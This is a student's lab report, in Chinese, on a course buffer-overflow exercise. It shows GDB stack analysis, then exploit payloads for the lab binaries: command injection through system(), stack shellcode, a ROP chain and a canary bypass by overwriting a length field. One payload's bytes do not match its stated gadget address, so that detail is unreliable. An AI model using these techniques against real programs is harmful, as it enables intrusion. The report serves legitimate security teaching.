# Lab 3 AttackLab 实验报告

姓名：詹天祚　学号：24300240058

## 1. 观察 `input` 的栈帧

```
$ gdb ./dark-calc
gef➤ b input
Breakpoint 1 at 0x40197b
gef➤ r
```

`b input` 没有停在函数的第 0 字节 `0x401977`，而是停在 `0x40197b`，也就是 prologue 后面那条 `sub rsp,0x10`。所以断下来的时候 `push rbp` 和 `mov rbp,rsp` 已经执行完，此时 `$rbp` 就是 `input` 自己的帧底，`$rsp` 与它相等。

```
registers
$rsp   : 0x0000721000800fe0  →  0x0000721000800ff0  →  0x00007fffffffdf30
$rbp   : 0x0000721000800fe0  →  0x0000721000800ff0  →  0x00007fffffffdf30
$rip   : 0x000000000040197b  →  <input+0004> sub rsp, 0x10

stack
0x721000800fe0│+0x00: 0x0000721000800ff0  ← $rsp, $rbp
0x721000800fe8│+0x08: 0x0000000000401ad1  →  <main+000e> mov eax, 0x0
0x721000800ff0│+0x10: 0x00007fffffffdf30
0x721000800ff8│+0x18: 0x0000000000401c1f  →  <__wrap_main+0011> mov rsp, r12

trace
[#0] 0x40197b → input()
[#1] 0x401ad1 → main()
```

第一个疑问是栈地址为什么这么整齐：`0x721000800fe0` 每次运行都一样，而普通程序的栈在 ASLR 下应该是随机的。把 `dark-calc` 反汇编出来看，`.init_array` 里挂了一个 `init_fixed_stack`，它在 `main` 之前用

```c
mmap((void *)0x721000000000, 0x802000, PROT_READ | PROT_WRITE | PROT_EXEC,
     MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED_NOREPLACE, -1, 0);
```

把从 `0x721000000000` 开始的 8MB 区域固定映射成可读写可执行，头尾各一页再 `mprotect` 成 `PROT_NONE` 当护栏，然后把 `base + 0x801000`（即 `0x721000801000`）存进全局变量。`__wrap_main`（`0x401c0e`）从这个全局变量里取出值赋给 `rsp`，再 `call main`。所以 `dark-calc` 的栈地址是写死的，这也是后面任务五能硬编码栈地址的前提。

### 五个问题

**1. `input` 函数是谁调用的？**

trace 里是 `#0 input()` 和 `#1 main()`，调用者是 `main`。

**2. 前三条指令在做什么？`$rbp` 指向的内存里的值从哪来？**

```
401977: 55           push rbp
401978: 48 89 e5     mov  rbp,rsp
40197b: 48 83 ec 10  sub  rsp,0x10
```

`push rbp` 把调用者（`main`）的帧指针压栈保存，`mov rbp,rsp` 让 `rbp` 指向当前帧底部，`sub rsp,0x10` 给 `char expression[16]` 腾出 16 字节，合起来是函数入口的 prologue。

此刻 `$rbp = 0x721000800fe0`，这个地址里存的是 `0x721000800ff0`，也就是 `main` 的 `rbp`。这个值是 `input` 自己的 `push rbp` 写进去的，因为 `main` 调用 `input` 之前 `rbp` 就是 `0x721000800ff0`。

于是栈帧可以画成：

```
0x721000800ff8   main 的返回地址 0x401c1f  (__wrap_main+0x11)
0x721000800ff0   main 的 rbp      0x7fffffffdf30
0x721000800fe8   input 的返回地址 0x401ad1  ← $rbp + 8
0x721000800fe0   saved rbp        0x721000800ff0  ← $rbp
0x721000800fd0   char expression[16]             ← $rbp - 0x10
```

**3. `$rbp + 8` 处存的是什么？**

`0x721000800fe8` 处的值是 `0x401ad1`。对照 `disas main`：

```
0x401ac3 <main+0>:   push  %rbp
0x401ac4 <main+1>:   mov   %rsp,%rbp
0x401ac7 <main+4>:   mov   $0x0,%eax
0x401acc <main+9>:   call  0x401977 <input>
0x401ad1 <main+14>:  mov   $0x0,%eax
0x401ad6 <main+19>:  call  0x4019d7 <eval>
```

`0x401ad1` 就是 `call input` 的下一条指令，也就是 `input` 的返回地址。

**4. 是哪一行汇编把值存到 `$rbp + 8` 的？**

在调用点 `0x401acc` 下断点，然后 `si`：

```
-- 执行前 --
$rsp = 0x721000800ff0
$rip = 0x401acc  <main+9>
0x721000800ff0: 0x00007fffffffdf30

-- si 之后 --
$rsp = 0x721000800fe8
$rip = 0x401977  <input>
0x721000800fe8: 0x0000000000401ad1
```

是 `call` 指令本身。它把下一条指令的地址 `0x401ad1` 压栈，`rsp` 减 8，`rip` 跳到 `0x401977`。

**5. `call`、prologue、`leave`、`ret` 的作用**

在 `input` 的 `leave`（`0x4019d5`）处下断点再单步：

```
-- 停在 leave --
$rbp = 0x721000800fe0   $rsp = 0x721000800fd0
0x721000800fe0: 0x0000721000800ff0   ← saved rbp
0x721000800fe8: 0x0000000000401ad1   ← 返回地址

-- si（leave）之后 --
$rbp = 0x721000800ff0   $rsp = 0x721000800fe8

-- 再 si（ret）之后 --
$rbp = 0x721000800ff0   $rsp = 0x721000800ff0   $rip = 0x401ad1
```

`call` 压入返回地址并跳转，prologue 压入调用者的 `rbp`、建立新帧、给局部变量留空间，`leave` 把 `rsp` 拉回帧底并弹出保存的 `rbp`，`ret` 从栈顶弹出返回地址送进 `rip`。`call` 压进去的返回地址由 `ret` 弹走，prologue 压进去的 saved rbp 由 `leave` 弹走，一进一出正好抵消。

## 2. 不同长度的输入

`input()` 里是 `char expression[16]` 加一句 `gets(expression)`，`gets` 不做长度检查。

**20 个 `A`**

```
$ python3 -c "print('A'*20)" | ./dark-calc
0
Enter an expression (length up to 15):
Executing: echo $((AAAAAAAAAAAAAAA))
Enter an expression (length up to 15):
42_is_The_Ànswer
$ echo $?
0
```

开头那个 `0` 是 `system("echo $((AAAAAAAAAAAAAAA))")` 的输出，算术里没定义过的名字按 0 算。它抢在第一行是因为 `printf` 的提示还压在缓冲区里没刷出去，`sh` 的输出先进了管道。

程序活了下来。`expression` 占的是 `$rbp-0x10` 到 `$rbp-1`，`gets` 写 20 个字节会多写 4 个 `A` 进 saved rbp，第 20 个字节是 `gets` 补的 `\0`，于是 saved rbp 的低 5 个字节被改写，返回地址（下标 24 起）还是好的。原来的 saved rbp 是 `0x721000800ff0`（`f0 0f 80 00 10 72 00 00`），覆盖后低 5 字节变成 `41 41 41 41 00`，值成了 `0x0000720000414141`。`main` 自己不碰 `rbp`，所以没出问题。`eval` 里只打印了 15 个 `A`，因为 `len` 被 clamp 到 `MAXLEN`。第二行 `Enter an expression` 是 `main` 的 `while(1)` 又转了一圈，这次 `gets` 读到 EOF 返回 `NULL`，程序走 `puts(answer); exit(0)`，所以退出码是 0。

**32 个 `A`**

```
$ python3 -c "print('A'*32)" | ./dark-calc
Segmentation fault (core dumped)
$ echo $?
139
```

32 个字节正好把 saved rbp 和 `$rbp+8` 的返回地址都盖满。GDB 里看得很清楚：

```
gef➤ b *0x401ad6
gef➤ r < /tmp/a32.txt
Program received signal SIGSEGV, Segmentation fault.
0x00000000004019d6 in input ()
$1 = 0x4141414141414141
$2 = 0x4019d6
0x721000800fe8:  0x4141414141414141  0x00007fffffffdf00
```

停在 `0x4019d6` 这条 `ret` 上，`$rbp` 已经被 `leave` 恢复成 `0x4141414141414141`，栈顶（原来的返回地址槽）也是全 `A`，`ret` 想跳到 `0x4141414141414141`，那里没有可执行页面。

两次输入都越界了，只有 32 字节这次碰到了控制流。区别在于写入长度有没有盖到返回地址。

## 3. 执行实验提供的 `malware`

`malware` 是个 shell 脚本，会沿父进程链往上找 `comm` 为 `dark-calc` 的进程，找到就打印

```
### The bomb was triggered by the dark-calc process. ###
### You have successfully detonated the bomb! Congratulations! ###
```

所以只要让 `dark-calc` 自己执行 `./malware` 就行，不必生成一个 shell。

`eval()` 把 `command_buf` 前面拼上 `echo $((`（8 字节），末尾拼上 `))`，再交给 `system`：

```
0x401a6b  mov    edi, 0x6030d0      ← command_buf
0x401a70  call   system@plt
```

`command_buf` 是全局数组，`input()` 里用 `strcpy(command_buf, expression)` 复制进去，遇到 `\0` 就停。这里有两个空子：`strcpy` 不受 `MAXLEN` 限制，`expression` 里有多少（到 `\0` 为止）就复制多少，只要不超过 31 字节；另外只要输入里用 `;#` 把后面的内容注释掉，`eval` 拼出来的前缀和后缀就都失效了。

于是把 `expression` 的前 16 字节写成 `./malware;#` 加 5 个 `\0`，后面接伪造的 saved rbp 和新返回地址。返回地址不跳 `eval` 开头（那样会重新拼一遍前缀），直接跳到 `0x401a6b`。

```python
import struct, sys

def p64(x):
    return struct.pack("<Q", x)

expr  = b"./malware;#"
first = expr + b"\x00" * (16 - len(expr))
saved_rbp = p64(0x721000800ff0)
ret       = p64(0x401a6b)

sys.stdout.buffer.write(first + saved_rbp + ret)
```

共 32 字节：

```
偏移 0x00: 2e 2f 6d 61 6c 77 61 72 65 3b 23 00 00 00 00 00
偏移 0x10: f0 0f 80 00 10 72 00 00     0x721000800ff0
偏移 0x18: 6b 1a 40 00 00 00 00 00     0x401a6b
```

执行过程：

1. `gets` 读 32 字节，写满 `expression`，盖掉 saved rbp 和返回地址；
2. `strcpy` 把 `./malware;#` 复制到 `0x6030d0`；
3. `input` 的 `leave; ret` 弹出 `0x401a6b`，跳进 `eval` 的 `mov edi, command_buf; call system`；
4. `system("./malware;#")` 起一个 `sh -c` 跑 `./malware`；
5. `malware` 找到父进程链里的 `dark-calc`，打印成功信息；
6. `system` 返回后接着跑 `eval` 剩下的 `fflush`、`leave`、`ret`。这一段的 `rbp` 是伪造的 `0x721000800ff0`，正好是 `main` 的 `rbp`，所以 `leave` 之后 `rsp = 0x721000800ff0`、`pop rbp` 拿到 `main` 保存的 `rbp`、`ret` 从 `0x721000800ff8` 弹出 `0x401c1f`（`__wrap_main+0x11`），程序正常退出，退出码 0。

结果：

```
$ python3 payload.py > /tmp/p1.bin
$ cd attack && ./dark-calc < /tmp/p1.bin
  `-dark-calc,34273
      `-sh,34274 -c -- ./malware;#
          `-malware,34275 ./malware

### The bomb was triggered by the dark-calc process. ###
### You have successfully detonated the bomb! Congratulations! ###
$ echo $?
0
```

伪造 saved rbp 这一步是调出来的。第一版把 saved rbp 写成 8 个 `A`，`malware` 确实跑了，但接着在 `eval` 尾部崩掉（退出码 139），因为 `leave` 之后 `rbp` 是垃圾值，`ret` 去了野地址。

## 4. 查看 `main` 的机器码

```
gef➤ b *0x401ac3
gef➤ r < /dev/null
gef➤ x/20xb 0x401ac3
0x401ac3 <main>:      0x55 0x48 0x89 0xe5 0xb8 0x00 0x00 0x00
0x401acb <main+8>:    0x00 0xe8 0xa6 0xfe 0xff 0xff 0xb8 0x00
0x401ad3 <main+16>:   0x00 0x00 0x00 0xe8
```

前三行汇编对应的机器码：

| 位置 | 指令（AT&T 语法） | 机器码 | 长度 |
| --- | --- | --- | ---: |
| `main+0`（`0x401ac3`） | `push %rbp` | `55` | 1 字节 |
| `main+1`（`0x401ac4`） | `mov %rsp,%rbp` | `48 89 e5` | 3 字节 |
| `main+4`（`0x401ac7`） | `mov $0x0,%eax` | `b8 00 00 00 00` | 5 字节 |

机器码按执行顺序从低地址向高地址连续摆放，每条指令占多长由指令本身决定，多字节立即数和相对位移按小端序编码：

```
地址        字节                 指令              长度
0x401ac3    55                   push %rbp          1
0x401ac4    48 89 e5             mov %rsp,%rbp      3
0x401ac7    b8 00 00 00 00       mov $0x0,%eax      5
0x401acc    e8 a6 fe ff ff       call 0x401977      5
```

`b8` 是 `mov eax, imm32` 的操作码，后面跟 4 字节小端立即数 `00 00 00 00`，所以它占 5 字节；`48 89 e5` 是 REX 前缀加 `mov r64, r64` 的 ModR/M 编码，3 字节。用 `si` 单步看 `$rip` 依次是 `0x401ac3 → 0x401ac4 → 0x401ac7 → 0x401acc`，每次停在一条指令的开头，也就验证了这个排布。

## 5. 栈空间执行

第 1 节已经看到 `dark-calc` 的栈映射是 `PROT_READ|PROT_WRITE|PROT_EXEC` 且地址固定的，所以直接在 `expression` 里放机器码，再跳到 `expression` 的首地址 `0x721000800fd0` 就能执行。栈地址固定和栈可执行是两件独立的事：前者由 `mmap` 的固定地址决定，后者由页面权限决定，`dark-calc` 两样都占了。

跳过去之后要做的就是用 `grade_eval(4)` 打印 `Hope A will be your grade!`。`grade_eval` 在 `0x401a87`，参数走 `edi`：

```
bf 04 00 00 00        mov  edi, 4
b8 87 1a 40 00        mov  eax, 0x401a87
ff e0                 jmp  rax
```

这里用 `jmp` 而不是 `call`。用 `call` 的话，`grade_eval` 结尾的 `ret` 会回到 shellcode 后面第 12 字节的 `nop` 上继续往下跑，接着把 saved rbp 的字节当指令执行，必崩。用 `jmp` 就没有这个返回地址。`grade_eval` 的 `push rbp` 会落在偏移 0x18 那个槽上，所以它 `leave` 时弹的是 0x18，`ret` 再取偏移 0x20 的内容当返回地址，偏移 0x20 填 `exit@plt` 的 `0x401880` 就行。

payload 共 40 字节：

```
偏移 0x00: bf 04 00 00 00 b8 87 1a 40 00 ff e0   12 字节 shellcode
偏移 0x0c: 90 90 90 90                           4 字节 nop 填充
偏移 0x10: 00 00 00 00 00 00 00 00               saved rbp（随便填）
偏移 0x18: d0 0f 80 00 10 72 00 00               0x721000800fd0（跳到这里执行）
偏移 0x20: 80 18 40 00 00 00 00 00               0x401880（exit@plt）
```

结果：

```
$ python3 payload_dark.py > /tmp/p2.bin
$ cd attack && ./dark-calc < /tmp/p2.bin
 Hope A will be your grade!
$ echo $?
16
```

`grade_eval` 打印完 `fflush(stdout)`，然后返回地址落到 `exit@plt`，退出码是 `exit` 收到的参数，这里恰好是 16。没跳 `eval` 是因为 `eval` 会重新拼 `echo $(("` 那段前缀。

## 6. ROP

`dark-calc-nx` 没有那个固定栈，`input` 的局部变量在普通栈上，地址随 ASLR 变；栈也不可执行，放 shellcode 没用。程序本身是 non-PIE，代码段里的 gadget 地址固定，可以拼 ROP 链，取指始终发生在可执行的代码页上。

机器上没装 ROPgadget，我用 objdump 导出的反汇编加一段 python 扫字节（找 `5f c3` 即 `pop rdi; ret`）来找：

```
0x401a2a: 5b 5d 41 5c 41 5d 41 5e 41 5f c3   pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
```

`41 5f c3` 里从第二个字节开始就是 `5f c3`，所以 `0x401a33` 是一个现成的 `pop rdi; ret`，正好落在 `__libc_csu_init` 里面。函数里没有现成的 `pop rsi`、`pop rdx`，但这题只需要一个参数。

`input` 的缓冲区 16 字节，加上 saved rbp 的 8 字节，前 24 字节填 `A`，之后是链：

```
偏移 0x00: 41 × 24                        填满 expression 和 saved rbp
偏移 0x18: 33 1a 40 00 00 00 00 00        0x401a33  pop rdi; ret
偏移 0x20: 04 00 00 00 00 00 00 00        4
偏移 0x28: 78 19 40 00 00 00 00 00        0x401978  grade_eval
偏移 0x30: e0 16 40 00 00 00 00 00        0x4016e0  exit@plt
```

链尾接 `exit@plt`，因为 `grade_eval` 打印完会 `ret`，没有这个槽就掉到野地址。

对齐是 ROP 里常见的坑。glibc 的 `printf` 用 `movaps`，入口 `rsp` 差 8 字节就可能段错误。在 `grade_eval` 入口（`0x401978`）下断点看这条链：

```
$rsp = 0x7fffffffde80
$rsp % 16 = 0
```

正常 `call grade_eval` 进去时 `rsp` 应该 `≡ 8 mod 16`，这条链是 16 的整数倍，差了 8 字节。但这次打印正常，说明 `printf` 在这条路径上没踩到对齐要求。我又试了在链里多塞一个 `ret`（`0x401a34`）把对齐调过去，结果一样能过，最终版没有加。

```
$ python3 payload_rop.py > /tmp/p3.bin
$ cd attack && ./dark-calc-nx < /tmp/p3.bin
 Hope A will be your grade!
$ echo $?
16
```

## 7. Canary

`dark-log` 的结构体在源码里给出来了：

```c
struct log_frame {
  char expression[128];
  char logMsg[128];
  int  len;
  char pad[8];
};

void input(void) {
  struct log_frame f;
  f.len = 0;
  puts("Enter a log message:");
  if (gets(f.expression) == NULL) return;
  memcpy(f.logMsg + f.len, f.expression, sizeof(f.expression));
}
```

对应的栈布局（canary 由 `-fstack-protector` 插在 `rbp-8`）：

```
rbp-0x120   expression[128]
rbp-0xa0    logMsg[128]
rbp-0x20    len
rbp-0x18    pad
rbp-0x08    canary
rbp+0x00    saved rbp
rbp+0x08    返回地址
```

`gets(f.expression)` 从 `rbp-0x120` 往上写，能一路写到 canary、saved rbp 和返回地址。但 canary 是随机数，直接覆盖必被 `__stack_chk_fail` 拦下，不能硬来。

转机在 `memcpy(f.logMsg + f.len, ...)`：目标地址是 `logMsg + len`，而 `len` 在 `rbp-0x20`，位置在 `gets` 的写入方向上，能被读到。把 `len` 改成 `0xa8`（168）之后：

```
(rbp - 0xa0) + 168 = rbp + 8
```

`memcpy` 会把 `expression` 的前 128 字节原样写到 `rbp+8` 开始的位置，也就是返回地址所在的地方。而 `gets` 那边只要保证写进去的字节数不超过 `rbp-8` 的 canary：

```
payload 总长 279 字节 = 0x117
rbp - 0x120 + 279 = rbp - 9
```

`gets` 补的 `\0` 落在 `rbp-9`，canary（`rbp-8`）完好，`__stack_chk_fail` 查不出问题。等 `input` 正常返回时，返回地址已经被程序自己的 `memcpy` 换成了链。

payload 布局：

```
偏移 0x00: 链
           33 18 40 00 00 00 00 00   0x4018a3  pop rdi; ret
           04 00 00 00 00 00 00 00   4
           77 16 40 00 00 00 00 00   0x401677  grade_eval
           00 00 00 00 00 00 00 00   0（grade_eval 返回后跳这里，会崩）
偏移 0x20 ~ 0x7f: 0 填充
偏移 0x80 ~ 0xff: 42（'B'）×128       logMsg 的内容，随便填
偏移 0x100: a8 00 00 00                len = 0xa8
偏移 0x104 ~ 0x116: 0 填充
```

这里用 `0x4018a3` 的 `pop rdi; ret`，它是 `dark-log` 里唯一的简单 gadget。

```
$ python3 payload_canary.py > /tmp/p4.bin
$ cd attack && ./dark-log < /tmp/p4.bin
Enter a log message:

 Hope A will be your grade!
$ echo $?
139
```

退出码 139 是打印完之后崩的：链里 `grade_eval` 后面那个槽是 0，`grade_eval` 返回时 `ret` 到 0 就段错误。`dark-log` 没有 `exit@plt`（只有 `puts`、`__stack_chk_fail`、`printf`、`gets`、`fflush` 五个），`main` 自己也有 canary，想干净退出得另外构造，成本不值。好在 `grade_eval` 里打印完就 `fflush(stdout)`，崩溃不影响 stdout 上的结果。

### 如何重排局部变量才能让这种攻击失效

这个攻击要三件事同时成立：`gets` 能改到 `len`，`len` 决定 `memcpy` 的目的地址，`memcpy` 写得到 canary 上面。破坏任何一条就行。

最直接的是把 `len` 挪到 `expression` 的低地址一侧，比如声明成 `char pad[8]; int len; char expression[128]; char logMsg[128];`。`gets` 从 `expression` 开始只能往高地址写，碰不到 `len`，`memcpy` 的目标就固定成 `logMsg`，最多写到 `rbp-0x20`，连 canary 都够不着。

也可以在 `memcpy` 之前检查 `len` 的范围（`0 <= len <= 127`），或者干脆不用这个字段、用 `strlen(f.expression)` 之类的固定值。根本问题是让能被溢出的数据同时充当后续写操作的长度参数，把这两个角色拆开，攻击面就没了。编译选项上，`-fstack-protector-strong` 会把 `expression` 也算作受保护对象，但它保护的是 canary 本身，挡不住用可控偏移绕过 canary 这种玩法。

## 8. ASLR 观察

在相同环境中运行 `src/aslr.c` 编译得到的程序三次，同一局部变量的地址分别是：

```
0x7ffcec28c6d4
0x7ffe8753cea4
0x7ffdd0a9d744
```

三个值都不一样，说明变量的栈地址随进程启动变化。用 GDB 对照时还要看 `disable-randomization` 设置，它为 `on` 时 GDB 会请求关闭被调试进程的地址随机化，所以 GDB 里看到的地址每次相同不能当成程序本身的行为。反过来用 GDB 在 `input` 入口看 `dark-calc` 的 `$rbp`，三次运行都是 `0x721000800fe0`，固定栈不受 ASLR 影响。

| 程序 | 栈是否可执行 | 栈地址 | Canary | 主程序 |
| --- | --- | --- | --- | --- |
| `dark-calc` | 可执行 | 程序显式固定 | 无 | non-PIE |
| `dark-calc-nx` | 不可执行 | 随机化 | 无 | non-PIE |
| `dark-log` | 不可执行 | 随机化 | 有 | non-PIE |

## 结语

在实验文档末尾，关于 LLM 可能让现有考核和评价体系失效的体系确实让我感触良多。在过去，完成一次实验需要日复一日的盯着代码，绞尽脑汁地想，在 baidu、bing、google 上为中文语料的匮乏抓耳挠腮，又痛恨自己英语能力不足，读不动英文文档。那时候程序和代码不会把答案直接摆在你面前，一行一句都是前人学习和表达的产物。现在有了 LLM，AI 一眼就能看出 gadget 在哪个字节、`exit@plt` 是哪个地址、`movaps` 会不会因为栈不对齐崩掉；只需要一次简单的提问，AI 就会给我们答案。

必须承认，LLM 出现之后，做实验的过程和以前不一样了。在以前，我需要一个个查陌生的名词，在网上找类似的例子和模板，才能勉强交出一份作业；现在，我可以把事情交给 AI：遇到不懂的名词问它，不好做的操作让它做，难写的报告让它写。这次实验几乎就是 LLM 独立做完的，我只是在中间不停提问，诸如“这些名词是什么含义”“你的这些操作都是干什么的”“这里我看不懂，再仔细讲讲，拒绝防御性表达”“为什么这么操作会出现这样的结果，从头到尾给我讲讲”此类问题，实验从输出变成了输入。AI 输出得比我思考快得多，看着它一行行往外吐，有时候会恍惚觉得面前有一条河在流淌，永不停息。大量知识从脑子里流过，远超我能理解的量，但也因此了解到了不少其它领域的知识。我现在还没学会让 LLM 真正帮到自己的学习，不过我相信我会找到使用 LLM 让知识真正留在脑子里的方法！

最后，非常感谢助教出的题和写的文档，从中可以看到许多小巧思。AI 确实很强，但我还是愿意相信，人对知识的好奇和追问，是这类实验值得做下去的理由。再次谢谢各位助教！
